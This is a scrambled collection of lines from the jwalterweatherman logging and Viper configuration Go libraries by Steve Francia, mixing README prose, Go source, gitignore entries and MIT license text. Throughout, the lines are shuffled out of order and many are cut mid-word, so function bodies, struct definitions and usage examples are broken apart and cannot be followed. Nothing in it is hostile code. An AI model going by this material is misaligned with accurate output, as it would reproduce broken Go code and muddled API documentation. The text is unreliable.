"    jww.INFO.Printf(""information %q"", response)"
These each are loggers based on the log standard library and follow the
Maybe you think that 7 levels are too much for any application... and you
s super fast please checkout Hugo.
 Step 2. Optionally configure JWW
    if err2 != nil {
    }
Remember they only have to mean something to your project.
 CRITICAL
    import (
s something that may not be what the user
execute after the change was made.
I wrote this for use in [hugo](https://gohugo.io). If you are looking
        // This error isn
I really wanted a very straightforward library that could seamlessly do
"notepad = jww.NewNotepad(jww.LevelInfo, jww.LevelTrace, os.Stdout, ioutil.Discard, """", log.Ldate"
This is very useful if your application has a verbose mode. Of course you
that it won
io.Writer
    )
 Warn and above is logged (when a log file/io.Writer is provided)
_Why 7 levels
"ve tried. I like this one pretty well, but no guarantees"
 WARN
t mean
 DEBUG
"1. Replace all the println, printf, etc statements thoughout my code with"
level before making any other calls if you want to see what it's up to.
"Note that JWW's own internal output uses log levels as well, so set the log"
1. Ready to go out of the box. 
JWW is primarily a wrapper around the excellent standard log library. It
        // default thresholds.
the following things.
are probably correct. Just because there are seven levels doesn
 Changing the thresholds
2. One library for both printing to the terminal and logging (to files).
No initialization or setup needs to happen. Just start calling things.
s as easy to use as fmt.Println.
log.Ltime)
s relevant to what
   something more useful
        // it. It will be printed to the terminal as well as logged under the
 3 provide easy verbose mode for output and logs
3. Really easy to log to either a temp file or a file you specify.
        jww.SetStdoutThreshold(jww.LevelInfo)
This is an early release. I
for a static website engine that
"        // expects. Under the default thresholds, Warn will be logged, but"
ve been using it for a while and this is the
=================
"        jww ""github.com/spf13/jwalterweatherman"""
Available Loggers are:
t going to materially change the behavior of the
provides a few advantages over using the standard log library alone.
 Usage
        // This is a pretty serious error and the user should know about
 Setting a log file
3. Allow the user to easily control what levels are logged
can decide what verbose means to you or even have multiple levels of
"The threshold can be changed at any time, but will only affect calls that"
 INFO
    if err != nil {
    // discarded.
third interface I
t change a bit.
2. Allow the user to easily control what levels are printed to stdout
Put calls throughout your source based on type of feedback.
        // not printed to the terminal. 
"of this software and associated documentation files (the ""Software""), to deal"
copies or substantial portions of the Software.
"copies of the Software, and to permit persons to whom the Software is"
"furnished to do so, subject to the following conditions:"
"AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER"
"LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,"
"IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,"
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
"THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR"
The MIT License (MIT)
SOFTWARE.
"in the Software without restriction, including without limitation the rights"
Copyright (c) 2014 Steve Francia
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
The above copyright notice and this permission notice shall be included in all
"to use, copy, modify, merge, publish, distribute, sublicense, and/or sell"
"Permission is hereby granted, free of charge, to any person obtaining a copy"
"// SetFlags set the flags for the default logger. ""log.Ldate "
// LogCountForLevelsGreaterThanorEqualTo returns the number of log invocations
return defaultNotepad.LogCountForLevelsGreaterThanorEqualTo(threshold)
"""io/ioutil"""
FATAL = defaultNotepad.FATAL
"""os"""
log.Logger
return defaultNotepad.LogCountForLevel(l)
// greater than or equal to a given threshold.
FEEDBACK 
ERROR    
CRITICAL = defaultNotepad.CRITICAL
reloadDefaultNotepad()
return defaultNotepad.stdoutThreshold
"defaultNotepad = NewNotepad(LevelError, LevelWarn, os.Stdout, ioutil.Discard, """", log.Ldate"
defaultNotepad.SetFlags(flags)
// GetStdoutThreshold returns the Treshold for the stdout logger.
func LogCountForLevelsGreaterThanorEqualTo(threshold Threshold) uint64 {
// Info by default.
defaultNotepad.SetStdoutThreshold(threshold)
// SetPrefix set the prefix for the default logger. Empty by default.
defaultNotepad.SetLogOutput(handle)
func SetPrefix(prefix string) {
WARN = defaultNotepad.WARN
// license that can be found in the LICENSE file.
return defaultNotepad.GetStdoutThreshold()
func LogCountForLevel(l Threshold) uint64 {
INFO = defaultNotepad.INFO
LOG = defaultNotepad.LOG
defaultNotepad.SetLogThreshold(threshold)
 2016 Steve Francia <spf@spf13.com>.
func GetStdoutThreshold() Threshold {
defaultNotepad 
WARN     
return defaultNotepad.GetLogThreshold()
// Level returns the current global output threshold.
import (
// Use of this source code is governed by an MIT-style
func LogThreshold() Threshold {
"""log"""
// Level returns the current global log threshold.
package jwalterweatherman
// Copyright 
// SetLogThreshold set the log threshold for the default notepad. Trace by default.
DEBUG = defaultNotepad.DEBUG
func SetFlags(flags int) {
Feedback
TRACE    
LOG      
func init() {
FATAL    
func SetStdoutThreshold(threshold Threshold) {
func GetLogThreshold() Threshold {
TRACE = defaultNotepad.TRACE
FEEDBACK = defaultNotepad.FEEDBACK
return defaultNotepad.logThreshold
func ResetLogCounters() {
log.Ltime)
DEBUG    
// SetStdoutThreshold set the standard output threshold for the default notepad.
INFO     
// ResetLogCounters resets the invocation counters for all levels.
func reloadDefaultNotepad() {
ERROR = defaultNotepad.ERROR
func SetLogThreshold(threshold Threshold) {
Notepad
func SetLogOutput(handle io.Writer) {
// GetStdoutThreshold returns the defined Treshold for the log logger.
// SetLogOutput set the log output for the default notepad. Discarded by default.
defaultNotepad.SetPrefix(prefix)
CRITICAL 
"""io"""
defaultNotepad.ResetLogCounters()
// LogCountForLevel returns the number of log invocations for a given threshold.
func StdoutThreshold() Threshold {
var (
" log.Ltime"" by default."
[568vq].out
_testmain.go
 Architecture specific extensions/prefixes
_cgo_export.
.[568vq]
.exe
.cgo1.go
_cgo_gotypes.go
_test
 Folders
_cgo_defun.c
_obj
.cgo2.c
" Compiled Object files, Static and Dynamic libs (Shared Objects)"
Notepad) SetPrefix(prefix string) {
Notepad) SetLogThreshold(threshold Threshold) {
counter := 
out 
func (n 
var prefixes map[Threshold]string = map[Threshold]string{
default:
"fb.output(fmt.Sprintf(format, v...))"
log.Logger
n.flags = flags
return n
Notepad{}
 prefix 
LevelCritical
"LevelFatal:    ""FATAL"","
n.logThreshold = threshold
Feedback) Print(v ...interface{}) {
FEEDBACK 
"n.TRACE, "
logThreshold    Threshold
n.stdoutThreshold = threshold
"fb.log.Output(2, s)"
ERROR    
// Notepad is where you leave a note!
// brackets at the beginning of the line. An empty prefix won't be displayed at all.
"LevelCritical: ""CRITICAL"","
" ""] """
Notepad) init() {
// Feedback writes plainly to the outHandle while
case threshold >= n.stdoutThreshold:
// init creates the loggers for each level depending on the notepad thresholds.
"n.CRITICAL, "
n.loggers = [7]
n.outHandle = outHandle
"logger = log.New(io.MultiWriter(counter, logAndOut), prefix, n.flags)"
LevelError
"fb.out.Output(2, s)"
fb.output(fmt.Sprintln(v...))
"n.prefix = ""["" "
n.init()
return n.logThreshold
// SetFlags choose which flags the logger will display (after prefix and message
return prefixes[t]
// log file.
n.logHandle = handle
n.logCounters[t] = counter
stdoutThreshold Threshold
log.Logger{
if fb.log != nil {
// GetStdoutThreshold returns the Treshold for the stdout logger.
 threshold >= n.stdoutThreshold:
// NewNotepad create a new notepad.
logCounter{}
"""LOG:   "","
log 
"n.prefix = """""
type Feedback struct {
"LevelDebug:    ""DEBUG"","
func (t Threshold) String() string {
type Threshold int
type Notepad struct {
// license that can be found in the LICENSE file.
Notepad) SetStdoutThreshold(threshold Threshold) {
} else {
logHandle       io.Writer
"LevelInfo:     ""INFO"","
"Feedback) Printf(format string, v ...interface{}) {"
LevelInfo
"for t, logger := range n.loggers {"
// SetLogOutput changes the file where log messages are written.
logCounter
"logger = log.New(io.MultiWriter(counter, n.outHandle), prefix, n.flags)"
 2016 Steve Francia <spf@spf13.com>.
WARN     
if fb.out != nil {
n.logThreshold = logThreshold
"""fmt"""
"n.ERROR, "
"LevelTrace:    ""TRACE"","
n.stdoutThreshold = outThreshold
"LevelError:    ""ERROR"","
import (
Notepad) GetLogThreshold() Threshold {
if len(prefix) != 0 {
// Use of this source code is governed by an MIT-style
n.FEEDBACK = 
Notepad) SetLogOutput(handle io.Writer) {
"""log"""
"Feedback{out: log.New(outHandle, """", 0), log: n.LOG}"
Notepad) SetFlags(flags int) {
package jwalterweatherman
"LevelWarn:     ""WARN"","
n.logHandle = logHandle
// Copyright 
// for performance.
"logger = log.New(io.MultiWriter(counter, n.logHandle), prefix, n.flags)"
"// counter doesn't care about prefix and flags, so don't use them"
Feedback) output(s string) {
n.FATAL}
loggers         [7]
Feedback
TRACE    
// SetLogThreshold changes the threshold above which messages are written to the
// level). See the package log for more informations on this.
return n.stdoutThreshold
Notepad) GetStdoutThreshold() Threshold {
"n.WARN, "
 threshold.String() 
LOG      
"logger = log.New(counter, """", 0)"
FATAL    
outHandle       io.Writer
case threshold >= n.logThreshold 
DEBUG    
switch {
func (fb 
LevelTrace Threshold = iota
flags           int
INFO     
"// logging with the standard extra information (date, file, etc)."
threshold := Threshold(t)
// SetPrefix changes the prefix used by the notepad. Prefixes are displayed between
"func NewNotepad(outThreshold Threshold, logThreshold Threshold, outHandle, logHandle io.Writer, prefix string, flags int) "
Notepad {
"logAndOut := io.MultiWriter(n.outHandle, n.logHandle)"
LevelDebug
case threshold >= n.logThreshold:
LevelFatal
"n.INFO, "
// SetStdoutThreshold changes the threshold above which messages are written to the
// One per Threshold
LevelWarn
// GetStdoutThreshold returns the defined Treshold for the log logger.
Feedback) Println(v ...interface{}) {
" "" """
CRITICAL 
// standard output.
"""io"""
fb.output(fmt.Sprint(v...))
n.flags)
prefix          string
"n.LOG = log.New(n.logHandle,"
logCounters [7]
prefix := n.prefix 
"n.DEBUG, "
n := 
const (
module github.com/spf13/jwalterweatherman
"home := os.Getenv(""HOMEDRIVE"") "
"return os.Getenv(""HOME"")"
"""path/filepath"""
insensitiviseMap(val.(map[string]interface{}))
m3 := make(map[string]interface{})
if err == nil {
case 'm':
"home = os.Getenv(""USERPROFILE"")"
// => replace with a new map
// toCaseInsensitiveValue checks if the value is a  map
lastChar := len(sizeStr) - 1
"func deepSearch(m map[string]interface{}, path []string) map[string]interface{} {"
// nested map: recursively insensitivise
switch val.(type) {
multiplier = 1 << 10
sizeStr = strings.TrimSpace(sizeStr[:lastChar])
package viper
default:
"""os"""
multiplier := uint(1)
" os.Getenv(""HOMEPATH"")"
if sizeStr[lastChar] == 'b' 
if !ok {
 inPath[end:]
"return false, nil"
"jww.INFO.Println(""Trying to resolve absolute path to"", inPath)"
err error
"end := strings.Index(inPath, string(os.PathSeparator))"
size := cast.ToInt(sizeStr)
// intermediate key does not exist
m[k] = m3
nm[lkey] = copyAndInsensitiviseMap(cast.ToStringMap(v))
if filepath.IsAbs(inPath) {
case 'g':
"""unicode"""
"p, err := filepath.Abs(inPath)"
// It believes that applications can be configured a variety of ways
"""strings"""
// Check if File / Directory Exists
if lastChar > 0 {
switch v := val.(type) {
return m
"jww.ERROR.Println(""Couldn't discover absolute path"")"
 b > 1 
func (pe ConfigParseError) Error() string {
return 0
nm := make(map[string]interface{})
"""github.com/spf13/cast"""
"func stringInSlice(a string, list []string) bool {"
if lastChar > 1 {
inPath = userHomeDir() 
if a > 1 
"return """""
"if runtime.GOOS == ""windows"" {"
func toCaseInsensitiveValue(value interface{}) interface{} {
case map[string]interface{}:
func insensitiviseMap(m map[string]interface{}) {
multiplier = 1 << 20
m[lower] = val
"return true, nil"
if size < 0 {
lkey := strings.ToLower(key)
continue
"_, err := fs.Stat(path)"
// license that can be found in the LICENSE file.
"// deepSearch scans deep maps, following the key indexes listed in the"
return nm
// Viper is a application configuration system.
"""github.com/spf13/afero"""
"return fmt.Sprintf(""While parsing config: %s"", pe.err.Error())"
return c
// => create it and continue from there
return true
// intermediate key is a value
"m2, ok := m[k]"
// Error returns the formatted configuration error.
 inPath[5:]
// ConfigParseError denotes failing to parse configuration file.
case 'k':
"""fmt"""
sizeStr = strings.TrimSpace(sizeStr[:lastChar-1])
import (
// Use of this source code is governed by an MIT-style
 2014 Steve Francia <spf@spf13.com>.
switch v := value.(type) {
type ConfigParseError struct {
val = cast.ToStringMap(val)
"m3, ok := m2.(map[string]interface{})"
"// from the file system, or a remote key/value store."
"// if so, create a copy and lower-case the keys recursively."
// Copyright 
multiplier = 1 << 30
"// a new map is created and inserted, and the search continues from there:"
case map[interface{}]interface{}:
"// copyAndInsensitiviseMap behaves like insensitiviseMap, but creates a copy of"
// nested map: cast and recursively insensitivise
 c/b != a {
"// sequence ""path""."
return filepath.Clean(inPath)
sizeStr = strings.TrimSpace(sizeStr)
"func safeMul(a, b uint) uint {"
c := a 
"// the initial map ""m"" may be modified!"
m3 = make(map[string]interface{})
"if home == """" {"
nm[lkey] = copyAndInsensitiviseMap(v)
"for _, b := range list {"
// any map it makes case insensitive.
value = copyAndInsensitiviseMap(cast.ToStringMap(v))
"func exists(fs afero.Fs, path string) (bool, error) {"
value = copyAndInsensitiviseMap(v)
"if strings.HasPrefix(inPath, ""$HOME"") {"
jww.ERROR.Println(err)
// parseSizeInBytes converts strings like 1GB or 12 mb into an unsigned integer number of bytes
"delete(m, key)"
lower := strings.ToLower(key)
size = 0
switch unicode.ToLower(rune(sizeStr[lastChar-1])) {
"return false, err"
inPath = os.Getenv(inPath[1:end]) 
return home
"return safeMul(uint(size), multiplier)"
 sizeStr[lastChar] == 'B' {
"""runtime"""
"jww ""github.com/spf13/jwalterweatherman"""
func userHomeDir() string {
return value
// continue search from here
"for key, val := range m {"
return filepath.Clean(p)
// update map
return false
multiplier = 1
"// via flags, ENVIRONMENT variables, configuration files retrieved"
nm[lkey] = v
"// In case intermediate keys do not exist, or map to a non-map value,"
"// The last value is expected to be another map, and is returned."
m = m3
func absPathify(inPath string) string {
if b == a {
"for _, k := range path {"
if key != lower {
func parseSizeInBytes(sizeStr string) uint {
func copyAndInsensitiviseMap(m map[string]interface{}) map[string]interface{} {
"if strings.HasPrefix(inPath, ""$"") {"
if os.IsNotExist(err) {
// remove old key (not lower-cased)
   code.
type config struct {
bash
 method
err := viper.ReadInConfig() // Find and read the config file
not miss a beat.
One important thing to recognize when working with ENV variables is that the
the 
"    ""datastore.metric.host"": ""0.0.0.0"","
the environment variables. Both 
// any approach to require this configuration into your program.
 method provides this functionality.
"For example, given this configuration file, both "
BindPFlag()
 represents:
viper/remote
viper powered applications can read an update to a config file while running and
BindEnv(string...) : error
d be happy to merge it. It
"Once your flag set implements this interface, you can simply tell Viper to bind it:"
Viper can be thought of as a registry for all of your applications
which formats your application will permit.
"os.Setenv(""SPF_ID"", ""13"") // typically done outside of the app"
configuration level.
viper.WatchConfig()
" become undefined, they are "
 setting defaults
Viper supports the ability to have your application live read a config file while running.
" takes one or two parameters. The first parameter is the key name, the"
IsSet(key string) : bool
"        ""warehouse"": {"
item-size: 64
Viper can access a nested field by passing a 
GetInt(key string) : int
to an application.
" method, "
GetBool(key string) : bool
Viper requires minimal configuration so it knows where to look for config files.
Q: Why not INI files
y := viper.New()
 Accessing nested keys
"            ""port"": 2112"
using 
value if it
"func (f myFlag) ValueString() string { return ""my-flag-value"" }"
AllowEmptyEnvVar(bool)
package from the standard library. The pflag package can handle the flags
"required for a key, but it"
" reading from remote config systems (etcd or Consul), and watching changes"
cache2 := NewCache(cfg2)
for {
Examples:
"runtime_viper.AddRemoteProvider(""etcd"", ""http://127.0.0.1:4001"", ""/config/hugo.yml"")"
"really wants to add this feature, I"
You can also create many different vipers for use in your application. Each will
"viper.AddConfigPath(""."")               // optionally look for config in the working directory"
func main() {
A: Ini files are pretty awful. There
utm_campaign=pr-badge
Viper provides a mechanism to try to ensure that ENV variables are unique. By
 Getting
"pflag.Int(""flagname"", 1234, ""help message for flagname"")"
fSet := myFlagSet{
where a configuration file is expected.
Viper uses [crypt](https://github.com/xordataexchange/crypt) to retrieve
Now it
pflag.CommandLine.AddGoFlagSet(flag.CommandLine)
SetEnvPrefix
 etcd
"    // currently, only tested with etcd support"
"func (f myFlag) ValueType() string { return ""string"" }"
PathMap string 
    time.Sleep(time.Second 
"For example, create a Consul key/value store key "
max-items: 100
"viper.SetConfigType(""json"") // Need to explicitly set this to json"
AutomaticEnv
GetDuration(key string) : time.Duration
 default
datastore.metric.port
BindEnv
"runtime_viper.SetConfigType(""yaml"") // because there is no file extension in a stream of bytes, supported extensions are ""json"", ""toml"", ""yaml"", ""yml"", ""properties"", ""props"", ""prop"""
"the next configuration source. To treat empty environment variables as set, use"
name: steve
s useful in the event that a key hasn
" calls, but want your environmental variables to use "
    max-items: 100
FlagValueSet
defined for the flag package by importing these flags. This is accomplished
age: 35
"Viper will automatically assume that the key name matches the ENV variable name,"
$ crypt get -plaintext /config/hugo.json
 [Imgur
datastore.metric.protocol
// unmarshal config
 has a command-line helper that you can use to put configurations in your
"to work within an application, and can handle all types of configuration needs"
etc.
configuration values encrypted and have them automatically decrypted if you have
package supports are mirrored as methods on a viper.
does not
"subv := viper.Sub(""app.cache1"")"
"x.SetDefault(""ContentDir"", ""content"")"
type myFlag struct {}
"validate. Viper is designed to work with JSON, TOML or YAML files. If someone"
Optionally you can provide a function for Viper to run each time a change occurs.
"GetString(""datastore.metric.host"") // (returns ""127.0.0.1"")"
You can use your favorite format's marshaller with the config returned by 
 key/value store
 Consul
"// alternatively, you can create a new viper instance."
 setting explicit values
datastore.metric.host
"        ""metric"": {"
// read from remote config the first time.
with ENV:
" documentation for examples of how to set encrypted values, or"
        }
This obeys the precedence rules established above
"viper.Set(""LogFile"", LogFile)"
 is called.
"viper.GetBool(""loud"") // true"
"i := viper.GetInt(""flagname"") // retrieve value from viper"
 What is Viper
also implement your own required configuration source and feed it to viper.
K/V store. 
 Unmarshaling
"None of the specific paths are required, but at least one path should be provided"
"viper.BindPFlag(""port"", serverCmd.Flags().Lookup(""port""))"
"viper.AddConfigPath(""/etc/appname/"")   // path to look for the config file in"
GetStringMap(key string) : map[string]interface{}
![viper logo](https://cloud.githubusercontent.com/assets/173412/10886745/998df88a-8151-11e5-9448-4736db51020d.png)
"    ""port"": 8080,"
Viper does not default to any configuration search paths leaving defaults decision
shadowed
"When building a modern application, you don"
"fmt.Println(viper.Get(""hostname"")) // myhostname.com"
runtime_viper.Unmarshal(
 explicit call to Set
    item-size: 80
A: Viper is designed to be a [companion](http://en.wikipedia.org/wiki/Viper_(G.I._Joe))
 Marshalling to string
 object to rewrite Env
will cascade through the remaining configuration registries until found.
    err := runtime_viper.WatchRemoteConfig()
Unmarshal(rawVal interface{}) : error
Port int
"viper.AddRemoteProvider(""consul"", ""localhost:8500"", ""MY_CONSUL_KEY"")"
"You also have the option of Unmarshaling all or a specific value to a struct, map,"
hobbies:
SetEnvKeyReplacer(string...) 
$ go get github.com/xordataexchange/crypt/bin/crypt
"viper.AddSecureRemoteProvider(""etcd"",""http://127.0.0.1:4001"",""/config/hugo.json"",""/etc/secrets/mykeyring.gpg"")"
 Remote Key/Value Store Example - Encrypted
var runtime_viper = viper.New()
treats ENV variables as case sensitive._
status.svg)](https://godoc.org/github.com/spf13/viper)
 Working with Flags
GetTime(key string) : time.Time
var yamlExample = []byte(
A: Is there a better name for a [commander](http://en.wikipedia.org/wiki/Cobra_Commander)
"            ""port"": 3099"
GetStringSlice(key string) : []string
"BindEnv(""id"")"
 you want to focus on building awesome software.
You need to set a key to Consul key/value storage with JSON value containing your desired config.  
        continue
The following functions and methods exist:
"viper.SetConfigType(""json"") // because there is no file extension in a stream of bytes, supported extensions are ""json"", ""toml"", ""yaml"", ""yml"", ""properties"", ""props"", ""prop"""
// open a goroutine to watch remote changes forever
app:
"if viper.GetBool(""verbose"") {"
    // unmarshal new config into our runtime config struct. you can also use channel
 Working with multiple vipers
Cobra
Many Go projects are built using Viper including:
"it is accessed. This means you can bind as early as you want, even in an"
4. Provide an alias system to easily rename parameters without breaking existing
as used in the [Cobra](https://github.com/spf13/cobra) library.
 [Hugo](http://gohugo.io)
    item-size: 64
applications out of the box. There are five methods that exist to aid working
"// using standard library ""flag"" package"
but the ENV variable is IN ALL CAPS. When you explicitly provide the ENV
 allows you to use a 
s easy to specify
"fmt.Println(viper.Get(""port"")) // 8080"
"However, if "
if err != nil {
EnvPrefix
 by the higher-priority
utm_content=badge) [![GoDoc](https://godoc.org/github.com/spf13/viper
Simply tell the viper instance to watchConfig.
The use of [pflag](https://github.com/spf13/pflag/) in Viper does not preclude
"default values, but are overridden by configuration values retrieved from disk,"
There are two methods to do this:
Q: Why is it called 
"""github.com/spf13/pflag"""
"    fmt.Println(""verbose enabled"")"
func (f myFlag) HasChanged() bool { return false }
"            ""host"": ""198.0.0.1"","
", you can tell Viper to use a prefix while reading from"
 env
viper.ReadConfig(bytes.NewBuffer(yamlExample))
GetStringMapString(key string) : map[string]string
 Getting Values From Viper
"Viper will read a config string (as JSON, TOML, YAML or HCL) retrieved from a path"
After executing:
By default empty environment variables are considered unset and will fall back to
"viper.BindFlagValues(""my-flags"", fSet)"
 [EMC RexRay](http://rexray.readthedocs.org/en/stable/)
Viper) 
provides this. It is similar to a singleton.
"t.Fatalf(""unable to decode into struct, %v"", err)"
"viper.SetDefault(""Taxonomies"", map[string]string{""tag"": ""tags"", ""category"": ""categories""})"
 Setting Overrides
 Viper or Vipers
   command line flags.
 with value:
viper.BindPFlags(pflag.CommandLine)
"        ""address"": ""localhost"","
MY_CONSUL_KEY
"n"", err))"
 defaults to etcd on http://127.0.0.1:4001.
Confirm that your value was set:
Viper
configuration needs.
"viper.BindFlagValue(""my-flag-name"", myFlag{})"
"viper.AddConfigPath(""$HOME/.appname"")  // call multiple times to add many search paths"
"These could be from a command line flag, or from your own application logic."
how to use Consul.
 if set.
have its own unique set of configurations and values. Each can read from a
go func(){
"Viper has the ability to bind to flags. Specifically, Viper supports "
"In all of the examples above, they demonstrate using viper in its singleton"
  trousers: denim
"variables, flags, and remote K/V store, but you are not bound to them. You can"
 and 
SetEnvKeyReplacer
You may need to marhsal all the settings held in viper into a string rather than write them to a file. 
 Watching Changes in etcd - Unencrypted
"viper.SetConfigName(""config"") // name of config file (without extension)"
"variable is case sensitive. If the ENV variable name is not provided, then"
". When called, Viper will check for an environment variable any"
  cache1:
utm_source=badge
AllSettings()
SetEnvPrefix(string)
 [Docker Notary](https://github.com/docker/Notary)
    max-items: 200
"fmt.Println(""Config file changed:"", e.Name)"
"        t.Fatalf(""unable to marshal config to YAML: %v"", err)"
"cfg2 := viper.Sub(""app.cache2"")"
 Putting Values into Viper
s type.
"viper.RegisterAlias(""loud"", ""Verbose"")"
 Extract sub-tree
"i := viper.GetInt(""flagname"") // retrieve values from viper instead of pflag"
viper_test.go
Pflags
s important to recognize that Viper
x := viper.New()
"    ""host"": {"
"UnmarshalKey(key string, rawVal interface{}) : error"
Viper configuration keys are case insensitive.
func (f myFlagSet) VisitAll(fn func(FlagValue)) {
"viper.SetConfigType(""json"") // because there is no file extension in a stream of bytes,  supported extensions are ""json"", ""toml"", ""yaml"", ""yml"", ""properties"", ""props"", ""prop"""
 live watching and re-reading of config files (optional)
"GetString(""datastore.metric.host"") // returns ""0.0.0.0"""
 reading from command line flags
2. Provide a mechanism to set default values for your different
FlagValue
"import _ ""github.com/spf13/viper/remote"""
Like 
 will use this
"mapstructure:""path_map"""
 are already defined (and may be overridden). If in addition
pflag.Parse()
3. Provide a mechanism to set override values for options specified through
   command line or config file which is the same as the default.
 the search for the path
" was defined in the defaults, Viper would also find it."
clothing:
Viper provides two Go interfaces to bind other flag systems if you don
s Incus](https://github.com/Imgur/incus)
var C config
"variable name, it "
func NewCache(cfg 
AllowEmptyEnv
t want to worry about
"cfg1 := viper.Sub(""app.cache1"")"
check for a environment variable with a name matching the key uppercased and
Aliases permit a single value to be referenced by multiple keys
fn(flag)
"serverCmd.Flags().Int(""port"", 1138, ""Port to run Application server on"")"
"s no standard format, and they are hard to"
"You can use remote configuration in conjunction with local configuration, or"
Hacker: true
Name string
    }
    // ...
 represents a group of flags. This is a very simple example on how to implement this interface:
- snowboarding
"Viper predefines many configuration sources such as files, environment"
  jacket: leather
err := runtime_viper.ReadRemoteConfig()
err := viper.ReadRemoteConfig()
"y.SetDefault(""ContentDir"", ""foobar"")"
Example:
    c := viper.AllSettings()
 Registering and Using Aliases
Go configuration with fangs!
"viper.Get(""name"") // this would be ""steve"""
s easy to create these 2 caches separately as:
Here is an example of how to use Viper to search for and read a configuration file.
Suppose we have:
in a Key/Value store such as etcd or Consul.  These values take precedence over
 [doctl](https://github.com/digitalocean/doctl)
type myFlagSet struct {
"to use a single central repository for their configuration, the viper package"
GetFloat64(key string) : float64
 Env example
has been provided.
and formats. It supports:
"For example, "
 [BloomApi](https://www.bloomapi.com/)
json
"independently, together they make a powerful pair to handle much of your"
"viper.SetDefault(""LayoutDir"", ""layouts"")"
    // to implement a signal to notify the system of the changes
"Once your flag implements this interface, you can simply tell Viper to bind it:"
viper
"flags, or environment variables."
 5) // delay after each request
time a 
 [Nanobox](https://github.com/nanobox-io/nanobox)/[Nanopack](https://github.com/nanopack)
 is a powerful helper especially when combined with
viper.OnConfigChange(func(e fsnotify.Event) {
 method.
datastore.metric
subv
utm_medium=badge
"    ""hostname"": ""myhostname.com"""
Get()
Make sure you add all of the configPaths prior to calling 
"viper.AddRemoteProvider(""etcd"", ""http://127.0.0.1:4001"",""/config/hugo.json"")"
"configuration from the K/V store, which means that you can store your"
Viper comes ready to use out of the box. There is no configuration or
different vipers.
if err != nil { // Handle errors reading the config file
"            ""host"": ""127.0.0.1"","
" reading from JSON, TOML, YAML, HCL, and Java properties config files"
init()
func yamlStringSettings() string {
eyes : brown
 Remote Key/Value Store Example - Unencrypted
"panic(fmt.Errorf(""Fatal error config file: %s "
 Why Viper
    if err != nil {
initialization needed to begin using Viper. Since most applications will want
 delimited path of keys:
 delimiters. An
 Remote Key/Value Store Support
package main
Cache {...}
$ crypt set -plaintext /config/hugo.json /Users/hugo/settings/config.json
- go
independently of it.
AutomaticEnv()
Viper has full support for environment variables. This enables 12 factor
"viper.Set(""loud"", true)   // same result as prior line"
WatchConfig()
"example, if the following JSON file is loaded:"
"bs, err := yaml.Marshal(c)"
t use 
"To enable remote support in Viper, do a blank import of the "
"    yaml ""gopkg.in/yaml.v2"""
"id := Get(""id"") // 13"
"different config file, key value store, etc. All of the functions that viper"
 Watching and re-reading config files
"        },"
 config
currently a single Viper instance only supports a single configuration file.
"flags: []myFlag{myFlag{}, myFlag{}},"
//...
 flag
err := Unmarshal(
Set()
"viper.GetBool(""verbose"") // true"
item below it:
Get(key string) : interface{}
"        log.Errorf(""unable to read remote config: %v"", err)"
"    ""datastore"": {"
by a calling a convenience function provided by the pflag package called
- skateboarding
"In Viper, there are a few ways to get a value depending on the value"
You can also bind an existing set of pflags (pflag.FlagSet):
Viper is here to help with that.
"for _, flag := range flags {"
 and
"""flag"""
beard: true
AllSettings() : map[string]interface{}
"1. Find, load, and unmarshal a configuration file in JSON, TOML, YAML, HCL, or Java properties formats."
 reading from environment variables
"Lastly, if there exists a key that matches the delimited key path, its value"
 request is made. It will apply the following rules. It will
second is the name of the environment variable. The name of the environment
prefixed with the 
AddGoFlagSet().
viper.Get
  cache2:
 Reading Config from io.Reader
example of using it can be found in 
Extract sub-tree from Viper.
configuration file formats
 Reading Config Files
"func (f myFlag) Name() string { return ""my-flag-name"" }"
import (
flags []myFlag
prefix.
 [Clairctl](https://github.com/jgsqware/clairctl)
") with an immediate value, then all sub-keys of"
"viper.GetString(""logfile"") // case-insensitive Setting "
 Establishing Defaults
strings.Replacer
application foundation needs.
    runtime_viper.Unmarshal(
GetString(key string) : string
Viper uses the following precedence order. Each item takes precedence over the
crypt
t been set via
"viper.SetDefault(""ContentDir"", ""content"")"
"Gone are the days of needing to restart a server to have a config take effect,"
   configuration options.
 function.
style approach.
Viper is a complete configuration solution for Go applications including 12-Factor apps. It is designed
package:
"s not found. To check if a given key exists, the "
cache1 := NewCache(cfg1)
value will be read each time it is accessed. Viper does not fix the value when
 Working with Environment Variables
A good configuration system will support default values. A default value is not
runtime_conf)
 or something in your
the use of other packages that use the [flag](https://golang.org/pkg/flag/)
[![Build Status](https://travis-ci.org/spf13/viper.svg)](https://travis-ci.org/spf13/viper) [![Join the chat at https://gitter.im/spf13/viper](https://badges.gitter.im/Join%20Chat.svg)](https://gitter.im/spf13/viper
"Viper supports JSON, TOML, YAML, HCL, and Java Properties files. Viper can search multiple paths, but"
"When working with multiple vipers, it is up to the user to keep track of the"
One important thing to recognize is that each Get function will return a zero
5. Make it easy to tell the difference between when a user has provided a
" was overridden (by a flag, an environment variable,"
to [Cobra](https://github.com/spf13/cobra). While both can operate completely
", the value is not set when the binding method is called, but when"
See the 
"viper.Set(""Verbose"", true)"
The accessor methods also accept formatted paths to deeply nested keys. For
"_When working with ENV variables, it"
 reading from buffer
"        ""port"": 5799"
will be returned instead. E.g.
"config file, environment variable, remote configuration or flag."
"flag.Int(""flagname"", 1234, ""help message for flagname"")"
return string(bs)
the correct gpg keyring.  Encryption is optional.
IsSet()
"SetEnvPrefix(""spf"") // will be uppercased automatically"
 automatically add the prefix.
"For individual flags, the "
"viper.Set(""verbose"", true) // same result as next line"
keys to an extent. This is useful if you want to use 
"viper.SetConfigType(""yaml"") // or viper.SetConfigType(""YAML"")"
which creates a cache based on config information formatted as 
 Flag interfaces
 represents a single flag. This is a very simple example on how to implement this interface:
Viper does the following for you:
"    },"
"of this software and associated documentation files (the ""Software""), to deal"
copies or substantial portions of the Software.
"copies of the Software, and to permit persons to whom the Software is"
"furnished to do so, subject to the following conditions:"
"AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER"
"LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,"
